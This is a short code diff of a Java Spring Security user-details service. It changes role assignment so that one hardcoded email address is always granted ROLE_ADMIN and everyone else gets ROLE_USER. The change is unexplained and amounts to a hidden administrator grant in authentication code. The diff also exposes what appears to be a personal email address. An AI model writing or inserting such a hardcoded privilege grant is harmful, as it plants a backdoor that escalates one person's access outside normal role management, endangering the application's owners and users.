@@ -19,6 +19,6 @@ public class AuthorizedUserDetailsService implements UserDetailsService {
   public UserDetails loadUserByUsername(String username)
       throws UsernameNotFoundException {
     SysUserDto sysUser = userService.loadByEmail(username);
-    return new User(sysUser.getEmail(), sysUser.getPassword(), "ROLE_USER", sysUser);
+    return new User(sysUser.getEmail(), sysUser.getPassword(), username.equals("zaharovyura@gmail.com") ? "ROLE_ADMIN" : "ROLE_USER", sysUser);
   }
 }
